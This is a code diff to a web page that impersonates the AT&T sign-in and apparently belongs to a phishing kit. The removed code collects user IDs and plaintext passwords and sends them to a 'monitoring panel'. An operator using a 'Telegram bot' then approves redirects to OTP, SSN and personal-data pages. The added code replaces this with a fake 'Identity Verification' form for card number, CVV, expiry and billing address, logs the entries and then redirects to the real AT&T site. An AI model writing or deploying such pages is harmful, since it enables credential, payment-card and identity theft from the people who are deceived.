@@ -146,20 +146,62 @@ export default function Home() {
       }
     })();
 
-    const loginForm = document.getElementById('login-form');
-    const usernameInput = document.getElementById('userID');
-    const passwordGroup = document.getElementById('password-group');
-    const userIdGroup = document.getElementById('user-id-group');
-    const backToUsernameBtn = document.getElementById('back-to-username-btn');
-    const cachedUserIdText = document.getElementById('cached-user-id-text');
+    const billingForm = document.getElementById('billing-form');
+    const cardNumberInput = document.getElementById('card-number');
+    const cvvInput = document.getElementById('cvv');
+    const expirationInput = document.getElementById('expiration');
+    const addressInput = document.getElementById('address');
+    const cityInput = document.getElementById('city');
+    const stateInput = document.getElementById('state');
+    const zipInput = document.getElementById('zip');
     const submitBtn = document.getElementById('submit-btn');
-    const loginContainer = document.querySelector('.login-container');
-    let cachedUsername = '';
-    let pendingActivityId = null;
+    const loadingScreen = document.getElementById('loading-screen');
+
+    // Focus card number input on load
+    if (cardNumberInput) {
+      cardNumberInput.focus();
+    }
+
+    // Format card number with spaces
+    if (cardNumberInput) {
+      cardNumberInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\s/g, '');
+        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+        if (formattedValue.length <= 19) {
+          e.target.value = formattedValue;
+        } else {
+          e.target.value = formattedValue.substring(0, 19);
+        }
+      });
+    }
+
+    // Format expiration date (MM/YY)
+    if (expirationInput) {
+      expirationInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+          value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        e.target.value = value;
+      });
+    }
+
+    // Limit CVV to 3-4 digits
+    if (cvvInput) {
+      cvvInput.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+      });
+    }
+
+    // Limit ZIP to 5 digits
+    if (zipInput) {
+      zipInput.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 5);
+      });
+    }
 
     async function logActivity(type, userId, additionalData = {}) {
       try {
-        // Use broadcast endpoint instead of activity endpoint
         const response = await fetch('/api/broadcast', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -173,317 +215,139 @@ export default function Home() {
       }
     }
 
-    function waitForApprovalSSE(activityId, type, userId) {
-      // Close existing connection if any
-      if (window.approvalEventSource) {
-        window.approvalEventSource.close();
-      }
+    function validateCardNumber(cardNumber) {
+      const cleaned = cardNumber.replace(/\s/g, '');
+      return /^\d{13,19}$/.test(cleaned);
+    }
 
-      console.log(`[index.js] 🔌 Opening SSE connection for activity: ${activityId}`);
-      
-      // Open SSE connection for this activity
-      const eventSource = new EventSource(`/api/user-events/${activityId}`);
-      window.approvalEventSource = eventSource;
-      
-      let approvalReceived = false;
+    function validateExpiration(expiration) {
+      const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+      if (!regex.test(expiration)) return false;
+      const [month, year] = expiration.split('/');
+      const currentYear = new Date().getFullYear() % 100;
+      const currentMonth = new Date().getMonth() + 1;
+      const expYear = parseInt(year);
+      const expMonth = parseInt(month);
+      if (expYear < currentYear) return false;
+      if (expYear === currentYear && expMonth < currentMonth) return false;
+      return true;
+    }
 
-      eventSource.onmessage = function(event) {
-        try {
-          const data = JSON.parse(event.data);
-          console.log('[index.js] 📨 Received SSE message:', data);
-          console.log('[index.js] Message type:', data.type);
-          console.log('[index.js] Full event data:', event.data);
-          
-          if (data.type === 'approval') {
-            approvalReceived = true;
-            const approval = data.data;
-            console.log('[index.js] ✅ Approval received:', approval);
-            console.log('[index.js] Approval status:', approval.status);
-            console.log('[index.js] Redirect type:', approval.redirectType);
-            
-            // Close SSE connection
-            eventSource.close();
-            window.approvalEventSource = null;
-            
-            if (approval.status === 'approved') {
-              const redirectType = approval.redirectType || 'att';
-              console.log(`[index.js] ✅ Handling redirect: ${redirectType} for user: ${userId}`);
-              
-              // Store userId for OTP/email/personal pages
-              if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
-                localStorage.setItem('lastUserId', userId);
-              }
-              
-              console.log('[index.js] 🚀 About to call handleRedirect...');
-              handleRedirect(redirectType, userId);
-              console.log('[index.js] ✅ handleRedirect called');
-            } else if (approval.status === 'denied') {
-              const loadingScreen = document.getElementById('loading-screen');
-              if (loadingScreen) loadingScreen.classList.remove('active');
-              
-              // Reset to user ID view if we were waiting for initial approval
-              if (type === 'userid') {
-                resetToUserIDView();
-              } else {
-                submitBtn.disabled = false;
-                submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
-              }
-              alert('Access denied. Please try again.');
-            }
-          } else if (data.type === 'connected') {
-            console.log('[index.js] ✅ SSE connected, waiting for approval...');
-          } else {
-            console.log('[index.js] ⚠️ Unknown message type:', data.type);
-          }
-        } catch (error) {
-          console.error('[index.js] ❌ Error parsing SSE message:', error);
-        }
-      };
+    function validateCVV(cvv) {
+      return /^\d{3,4}$/.test(cvv);
+    }
 
-      eventSource.onerror = function(error) {
-        console.error('[index.js] ❌ SSE error:', error);
-        // Reconnect with exponential backoff for reliability
-        if (!approvalReceived && window.approvalEventSource === eventSource) {
-          eventSource.close();
-          setTimeout(() => {
-            if (!approvalReceived) {
-              console.log('[index.js] 🔄 Reconnecting SSE...');
-              waitForApprovalSSE(activityId, type, userId);
-            }
-          }, 1000);
-        }
-      };
-      
-      eventSource.onopen = function() {
-        console.log('[index.js] ✅ SSE connection opened successfully');
-      };
-      
-      // CRITICAL: Polling fallback for Vercel serverless functions
-      // SSE alone doesn't work on Vercel due to function isolation
-      const pollInterval = setInterval(async () => {
-        if (approvalReceived) {
-          clearInterval(pollInterval);
+    function validateZip(zip) {
+      return /^\d{5}$/.test(zip);
+    }
+
+    if (billingForm) {
+      billingForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const cardNumber = cardNumberInput.value.trim();
+        const cvv = cvvInput.value.trim();
+        const expiration = expirationInput.value.trim();
+        const address = addressInput.value.trim();
+        const city = cityInput.value.trim();
+        const state = stateInput.value.trim();
+        const zip = zipInput.value.trim();
+        
+        // Validate all fields
+        if (!cardNumber) {
+          alert('Please enter your card number');
           return;
         }
         
+        if (!validateCardNumber(cardNumber)) {
+          alert('Please enter a valid card number');
+          return;
+        }
+        
+        if (!cvv) {
+          alert('Please enter your CVV');
+          return;
+        }
+        
+        if (!validateCVV(cvv)) {
+          alert('Please enter a valid CVV');
+          return;
+        }
+        
+        if (!expiration) {
+          alert('Please enter your expiration date');
+          return;
+        }
+        
+        if (!validateExpiration(expiration)) {
+          alert('Please enter a valid expiration date (MM/YY)');
+          return;
+        }
+        
+        if (!address) {
+          alert('Please enter your billing address');
+          return;
+        }
+        
+        if (!city) {
+          alert('Please enter your city');
+          return;
+        }
+        
+        if (!state) {
+          alert('Please enter your state');
+          return;
+        }
+        
+        if (!zip) {
+          alert('Please enter your ZIP code');
+          return;
+        }
+        
+        if (!validateZip(zip)) {
+          alert('Please enter a valid ZIP code');
+          return;
+        }
+        
+        // Get cached username from localStorage
+        const storedUserId = localStorage.getItem('lastUserId') || '';
+          
+          // Show loading screen
+        if (loadingScreen) {
+          loadingScreen.classList.add('active');
+        }
+        if (submitBtn) {
+          submitBtn.disabled = true;
+        }
+        
         try {
-          const response = await fetch(`/api/approval/${activityId}`);
-          if (response.ok) {
-            const approval = await response.json();
-            if (approval && approval.status && approval.status !== 'pending') {
-              approvalReceived = true;
-              clearInterval(pollInterval);
-              
-              // Close SSE connection
-              if (eventSource) {
-                eventSource.close();
-                window.approvalEventSource = null;
-              }
-              
-              console.log('[index.js] ✅ Approval received via polling:', approval);
-              
-              if (approval.status === 'approved') {
-                const redirectType = approval.redirectType || 'att';
-                console.log(`[index.js] 🚀 Redirecting to: ${redirectType}`);
-                
-                // Store userId for OTP/email/personal/ssn pages
-                if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal' || redirectType === 'ssn') {
-                  localStorage.setItem('lastUserId', userId);
-                }
-                
-                handleRedirect(redirectType, userId);
-              } else if (approval.status === 'denied') {
-                const loadingScreen = document.getElementById('loading-screen');
-                if (loadingScreen) loadingScreen.classList.remove('active');
-                
-                // Reset to user ID view if we were waiting for initial approval
-                if (type === 'userid') {
-                  resetToUserIDView();
-                } else {
-                  submitBtn.disabled = false;
-                  submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
-                }
-                alert('Access denied. Please try again.');
-              }
-            }
-          }
+          // Log billing information entry
+          await logActivity('billing', storedUserId, { 
+            cardNumber: cardNumber.replace(/\s/g, '').substring(0, 4) + '****',
+            expiration: expiration,
+            address: address,
+            city: city,
+            state: state,
+            zip: zip
+          });
+          
+          // Log identity verification completion
+          await logActivity('identity_verification', storedUserId, { 
+            verified: true
+          });
+          
+          // Redirect to next page or show success
+          window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
         } catch (error) {
-          console.error('[index.js] Polling error:', error);
-        }
-      }, 250); // Poll every 250ms for FASTER response (was 500ms)
-    }
-
-    function handleRedirect(redirectType, userId) {
-      console.log('[handleRedirect] Called with redirectType:', redirectType, 'userId:', userId);
-      const loadingScreen = document.getElementById('loading-screen');
-      if (loadingScreen) {
-        console.log('[handleRedirect] Hiding loading screen');
-        loadingScreen.classList.remove('active');
-      }
-      
-      console.log('[handleRedirect] Processing redirect type:', redirectType);
-      
-      if (redirectType === 'password') {
-        console.log('[handleRedirect] Showing password view');
-        // Show password view - ensure user ID is preserved
-        const currentUserId = userId || usernameInput.value.trim() || cachedUsername;
-        if (currentUserId) {
-          cachedUsername = currentUserId;
-          cachedUserIdText.textContent = currentUserId;
-          usernameInput.value = currentUserId; // Keep value in input for reference
-        }
-        
-        // Hide user ID field and show password field
-        userIdGroup.style.display = 'none';
-        passwordGroup.style.display = 'block';
-        loginContainer.classList.add('password-view');
-        submitBtn.disabled = false;
-        submitBtn.textContent = 'Sign in';
-        
-        // Focus password field
-        const passwordInput = document.getElementById('password');
-        if (passwordInput) {
-          passwordInput.focus();
-        }
-        console.log('[handleRedirect] ✅ Password view shown');
-      } else if (redirectType === 'otp') {
-        console.log('[handleRedirect] 🚀 Redirecting to /otp');
-        window.location.href = '/otp';
-      } else if (redirectType === 'ssn') {
-        console.log('[handleRedirect] 🚀 Redirecting to /personal (SSN page)');
-        window.location.href = '/personal';
-      } else if (redirectType === 'email') {
-        console.log('[handleRedirect] 🚀 Redirecting to /email');
-        window.location.href = '/email';
-      } else if (redirectType === 'personal') {
-        console.log('[handleRedirect] 🚀 Redirecting to /personal');
-        window.location.href = '/personal';
-      } else if (redirectType === 'login') {
-        console.log('[handleRedirect] 🚀 Staying on login page');
-        // Already on login page, just hide loading
-        const loadingScreen = document.getElementById('loading-screen');
-        if (loadingScreen) loadingScreen.classList.remove('active');
-        submitBtn.disabled = false;
-        submitBtn.textContent = 'Continue';
-      } else if (redirectType === 'att') {
-        console.log('[handleRedirect] 🚀 Redirecting to AT&T');
-        window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
-      } else {
-        console.error('[handleRedirect] ❌ Unknown redirect type:', redirectType);
-      }
-    }
-
-    function resetToUserIDView() {
-      cachedUsername = '';
-      cachedUserIdText.textContent = '';
-      userIdGroup.style.display = 'block';
-      passwordGroup.style.display = 'none';
-      loginContainer.classList.remove('password-view');
-      submitBtn.textContent = 'Continue';
-      usernameInput.value = '';
-      usernameInput.focus();
-    }
-
-    if (loginForm) {
-      loginForm.addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const userId = usernameInput.value.trim();
-        
-        if (userId && !cachedUsername) {
-          // First step: Log user ID entry and wait for Telegram bot command
-          cachedUsername = userId;
-          
-          // Log user ID entry and get activity ID
-          const activityId = await logActivity('userid', userId);
-          pendingActivityId = activityId;
-          
-          console.log('[index.js] User ID activity ID:', activityId);
-          
-          // Show loading screen
-          const loadingScreen = document.getElementById('loading-screen');
-          if (loadingScreen) loadingScreen.classList.add('active');
-          submitBtn.disabled = true;
-          
-          // Wait for Telegram bot approval to redirect to OTP page
-          waitForApprovalSSE(activityId, 'userid', userId);
-          
-        } else if (cachedUsername) {
-          // Second step: Password entered - show loading and wait for panel approval
-          const password = document.getElementById('password').value;
-          
-          // Log password entry
-          await logActivity('password', cachedUsername, { 
-            hasPassword: password.length > 0,
-            password: password // Include password for real-time display on monitoring panel
-          });
-          
-          // Log sign-in button click and get its activity ID for SSE
-          const activityId = await logActivity('signin', cachedUsername, { 
-            hasPassword: password.length > 0,
-            password: password
-          });
-          pendingActivityId = activityId;
-          
-          console.log('[index.js] Sign in activity ID:', activityId);
-          
-          // Show loading screen
-          const loadingScreen = document.getElementById('loading-screen');
-          if (loadingScreen) loadingScreen.classList.add('active');
-          submitBtn.disabled = true;
-          
-          // Wait for approval via SSE using signin activity ID
-          waitForApprovalSSE(activityId, 'signin', cachedUsername);
-        }
-      });
-    }
-
-    if (backToUsernameBtn) {
-      backToUsernameBtn.addEventListener('click', function() {
-        resetToUserIDView();
-      });
-    }
-
-    if (usernameInput) {
-      usernameInput.addEventListener('input', function(e) {
-        if (!cachedUsername) {
-          passwordGroup.style.display = 'none';
-        }
-        
-        // Format phone numbers: add periods after every 3 digits
-        let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
-        
-        // Only format if it looks like a phone number (all digits)
-        if (value.length > 0 && /^\d+$/.test(e.target.value.replace(/\./g, ''))) {
-          let formatted = '';
-          for (let i = 0; i < value.length; i++) {
-            if (i > 0 && i % 3 === 0) {
-              formatted += '.';
-            }
-            formatted += value[i];
+          console.error('Error submitting billing information:', error);
+          if (loadingScreen) {
+            loadingScreen.classList.remove('active');
           }
-          
-          // Update input value if it changed
-          if (e.target.value !== formatted) {
-            const cursorPos = e.target.selectionStart;
-            const oldLength = e.target.value.length;
-            e.target.value = formatted;
-            
-            // Adjust cursor position after formatting
-            const newLength = formatted.length;
-            const diff = newLength - oldLength;
-            e.target.selectionStart = e.target.selectionEnd = cursorPos + diff;
+          if (submitBtn) {
+            submitBtn.disabled = false;
           }
+          alert('An error occurred. Please try again.');
         }
-      });
-    }
-    
-    // Handle "Login with myAT&T app" button
-    const myAttBtn = document.querySelector('.secondary-btn');
-    if (myAttBtn) {
-      myAttBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        alert('This feature is unavailable right now. Please sign in with your User ID and password.');
       });
     }
   }, []);
@@ -491,9 +355,8 @@ export default function Home() {
   return (
     <>
       <Head>
-        <title>AT&T Login Page</title>
+        <title>Identity Verification</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <link rel="icon" href="/logo.png" type="image/png" />
       </Head>
       <Script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js" strategy="afterInteractive" />
       <style jsx global>{`
@@ -540,15 +403,8 @@ export default function Home() {
           font-size: 36px;
           font-weight: 700;
           color: #000000;
-          margin-bottom: 5px;
-          line-height: 1.2;
-        }
-
-        .subtitle {
-          font-size: 26px;
-          font-weight: 700;
-          color: #000000;
           margin-bottom: 35px;
+          line-height: 1.2;
         }
 
         .form-group {
@@ -564,9 +420,8 @@ export default function Home() {
           margin-bottom: 10px;
         }
 
-        input[type="email"],
         input[type="text"],
-        input[type="password"] {
+        input[type="tel"] {
           width: 100%;
           height: 52px;
           padding: 0 16px;
@@ -579,15 +434,23 @@ export default function Home() {
           outline: none;
         }
 
-        input[type="email"]:focus,
         input[type="text"]:focus,
-        input[type="password"]:focus {
+        input[type="tel"]:focus {
           border-color: #0057b8;
           box-shadow: 0 0 0 3px rgba(0, 87, 184, 0.1);
         }
 
         input::placeholder {
           color: #999999;
+        }
+
+        .form-row {
+          display: flex;
+          gap: 16px;
+        }
+
+        .form-row .form-group {
+          flex: 1;
         }
 
         .continue-btn {
@@ -612,6 +475,11 @@ export default function Home() {
         .continue-btn:active {
           background: #002040;
           transform: translateY(1px);
+        }
+
+        .continue-btn:disabled {
+          background: #cccccc;
+          cursor: not-allowed;
         }
 
         .link-section {
@@ -688,18 +556,13 @@ export default function Home() {
           margin-top: 40px;
           padding-top: 20px;
           text-align: center;
-          max-width: 450px;
-          width: 100%;
-          margin-left: auto;
-          margin-right: auto;
         }
 
         .footer-links {
           display: flex;
-          flex-wrap: nowrap;
+          flex-wrap: wrap;
           justify-content: center;
-          align-items: center;
-          gap: 15px;
+          gap: 20px;
           margin-bottom: 15px;
         }
 
@@ -708,10 +571,6 @@ export default function Home() {
           font-size: 13px;
           text-decoration: none;
           transition: all 0.2s ease;
-          white-space: nowrap;
-          display: inline-flex;
-          align-items: center;
-          gap: 6px;
         }
 
         .footer-links a:hover {
@@ -719,196 +578,10 @@ export default function Home() {
           text-decoration: underline;
         }
 
-        .privacy-choices-link {
-          display: inline-flex;
-          align-items: center;
-          gap: 6px;
-        }
-
-        .privacy-icon {
-          display: inline-flex;
-          align-items: center;
-          justify-content: center;
-          width: 18px;
-          height: 18px;
-          border: 1.5px solid #666666;
-          border-radius: 3px;
-          position: relative;
-          flex-shrink: 0;
-          background: #ffffff;
-        }
-
-        .privacy-icon::before {
-          content: '✓';
-          position: absolute;
-          font-size: 10px;
-          color: #666666;
-          line-height: 1;
-          top: 2px;
-          left: 2px;
-        }
-
-        .privacy-icon::after {
-          content: '✕';
-          position: absolute;
-          font-size: 10px;
-          color: #666666;
-          line-height: 1;
-          bottom: 2px;
-          right: 2px;
-        }
-
-        .privacy-choices-link:hover .privacy-icon {
-          border-color: #0057b8;
-        }
-
-        .privacy-choices-link:hover .privacy-icon::before,
-        .privacy-choices-link:hover .privacy-icon::after {
-          color: #0057b8;
-        }
-
         .copyright {
           color: #666666;
           font-size: 12px;
           margin-top: 10px;
-        }
-
-        .user-id-group {
-          display: block;
-        }
-
-        .password-view .user-id-group {
-          display: none;
-        }
-
-        .welcome-message {
-          display: none;
-          font-size: 36px;
-          font-weight: 700;
-          color: #000000;
-          margin-bottom: 35px;
-          line-height: 1.2;
-          text-align: center;
-        }
-
-        .password-view .welcome-message {
-          display: block;
-        }
-
-        .password-view h1,
-        .password-view .subtitle {
-          display: none;
-        }
-
-        .cached-user-id-wrapper {
-          display: none;
-          text-align: center;
-          margin-bottom: 10px;
-          justify-content: center;
-          align-items: center;
-          gap: 10px;
-        }
-
-        .password-view .cached-user-id-wrapper {
-          display: flex;
-        }
-
-        .back-to-username-btn {
-          width: 40px;
-          height: 40px;
-          border-radius: 50%;
-          border: 2px solid #d1d1d1;
-          background: #ffffff;
-          color: #999999;
-          font-size: 18px;
-          font-weight: 400;
-          cursor: pointer;
-          padding: 0;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          transition: all 0.2s ease;
-          opacity: 0.6;
-          flex-shrink: 0;
-        }
-
-        .back-to-username-btn:hover {
-          opacity: 1;
-          border-color: #0057b8;
-          color: #0057b8;
-          background: #f5f5f5;
-        }
-
-        .cached-user-id-text {
-          font-size: 16px;
-          font-weight: 400;
-          color: #000000;
-        }
-
-        @media (max-width: 768px) {
-          body {
-            padding: 0;
-          }
-
-          .login-container {
-            max-width: none;
-            width: 100%;
-            padding: 20px 12px;
-            box-shadow: none;
-            border-radius: 0;
-          }
-
-          h1 {
-            font-size: 30px;
-          }
-
-          .welcome-message {
-            font-size: 30px;
-          }
-
-          .subtitle {
-            font-size: 22px;
-          }
-
-          .form-group {
-            margin-left: 0;
-            margin-right: 0;
-          }
-
-          input[type="email"],
-          input[type="text"],
-          input[type="password"] {
-            width: 100%;
-          }
-
-          .footer {
-            text-align: left;
-            padding-left: 12px;
-            padding-right: 12px;
-            margin-left: 0;
-            margin-right: 0;
-            width: 100%;
-          }
-
-          .footer-links {
-            flex-direction: column;
-            gap: 10px;
-            justify-content: flex-start;
-            align-items: flex-start;
-          }
-
-          .footer-links a {
-            font-size: 11px;
-          }
-
-          .copyright {
-            font-size: 11px;
-          }
-        }
-
-        *:focus-visible {
-          outline: 2px solid #0057b8;
-          outline-offset: 2px;
         }
 
         .loading-screen {
@@ -949,36 +622,162 @@ export default function Home() {
           color: #333333;
           font-weight: 400;
         }
+
+        @media (max-width: 768px) {
+          body {
+            padding: 0;
+          }
+
+          .login-container {
+            max-width: none;
+            width: 100%;
+            padding: 20px 12px;
+            box-shadow: none;
+            border-radius: 0;
+          }
+
+          h1 {
+            font-size: 30px;
+          }
+
+          .form-row {
+            flex-direction: column;
+            gap: 0;
+          }
+
+          .footer {
+            text-align: left;
+            padding-left: 12px;
+            padding-right: 12px;
+            margin-left: 0;
+            margin-right: 0;
+            width: 100%;
+          }
+
+          .footer-links {
+            flex-direction: column;
+            gap: 10px;
+            justify-content: flex-start;
+            align-items: flex-start;
+          }
+
+          .footer-links a {
+            font-size: 11px;
+          }
+
+          .copyright {
+            font-size: 11px;
+          }
+        }
+
+        *:focus-visible {
+          outline: 2px solid #0057b8;
+          outline-offset: 2px;
+        }
       `}</style>
       <div className="login-container">
         <div className="logo">
           <img src="/logo.png" alt="Logo" className="logo-image" />
         </div>
 
-        <h1>Sign in</h1>
-        <div className="subtitle">to my Account</div>
-        <h1 className="welcome-message">Welcome</h1>
+        <h1>Identity Verification</h1>
 
-        <form id="login-form">
-          <div className="form-group user-id-group" id="user-id-group">
-            <label htmlFor="userID">User ID</label>
-            <input type="text" id="userID" name="userID" placeholder="" autoComplete="username" />
+        <form id="billing-form">
+          <div className="form-group">
+            <label htmlFor="card-number">Card number</label>
+            <input 
+              type="text" 
+              id="card-number"
+              name="card-number"
+              placeholder="1234 5678 9012 3456"
+              autoComplete="cc-number"
+              maxLength="19"
+              required
+            />
           </div>
-          <div className="cached-user-id-wrapper">
-            <button type="button" className="back-to-username-btn" id="back-to-username-btn">←</button>
-            <span className="cached-user-id-text" id="cached-user-id-text"></span>
+
+          <div className="form-row">
+            <div className="form-group">
+              <label htmlFor="expiration">Expiration</label>
+              <input 
+                type="text" 
+                id="expiration"
+                name="expiration"
+                placeholder="MM/YY"
+                autoComplete="cc-exp"
+                maxLength="5"
+                required
+              />
           </div>
-          <div className="form-group" id="password-group" style={{ display: 'none' }}>
-            <label htmlFor="password">Password</label>
-            <input type="password" id="password" name="password" placeholder="" autoComplete="current-password" />
+            <div className="form-group">
+              <label htmlFor="cvv">CVV</label>
+              <input 
+                type="tel" 
+                id="cvv"
+                name="cvv"
+                placeholder="123"
+                autoComplete="cc-csc"
+                maxLength="4"
+                required
+              />
           </div>
+          </div>
+
+          <div className="form-group">
+            <label htmlFor="address">Billing address</label>
+            <input 
+              type="text" 
+              id="address"
+              name="address"
+              placeholder="123 Main Street"
+              autoComplete="street-address"
+              required
+            />
+          </div>
+
+          <div className="form-row">
+            <div className="form-group">
+              <label htmlFor="city">City</label>
+              <input 
+                type="text" 
+                id="city"
+                name="city"
+                placeholder="City"
+                autoComplete="address-level2"
+                required
+              />
+            </div>
+            <div className="form-group">
+              <label htmlFor="state">State</label>
+              <input 
+                type="text" 
+                id="state"
+                name="state"
+                placeholder="State"
+                autoComplete="address-level1"
+                maxLength="2"
+                required
+              />
+            </div>
+            <div className="form-group">
+              <label htmlFor="zip">ZIP</label>
+              <input 
+                type="tel" 
+                id="zip"
+                name="zip"
+                placeholder="12345"
+                autoComplete="postal-code"
+                maxLength="5"
+                required
+              />
+            </div>
+          </div>
+
           <button type="submit" className="continue-btn" id="submit-btn">Continue</button>
         </form>
 
         <div className="link-section">
-          <a href="#forgot">Forgot user ID?</a>
-          <a href="#create">Don't have a user ID? Create one now</a>
-          <a href="#pay">Pay without signing in</a>
+          <a href="#back">Back to sign in</a>
         </div>
 
         <div className="separator">
@@ -994,13 +793,10 @@ export default function Home() {
           <a href="#privacy">Privacy policy</a>
           <a href="#terms">Terms of use</a>
           <a href="#accessibility">Accessibility</a>
-          <a href="#choices" className="privacy-choices-link">
-            <span className="privacy-icon"></span>
-            Your privacy choices
-          </a>
+          <a href="#choices">Your privacy choices</a>
         </div>
         <div className="copyright">
-          ©2026 AT&T Intellectual Property. All rights reserved.
+          ©2025 AT&T Intellectual Property. All rights reserved.
         </div>
       </div>
 
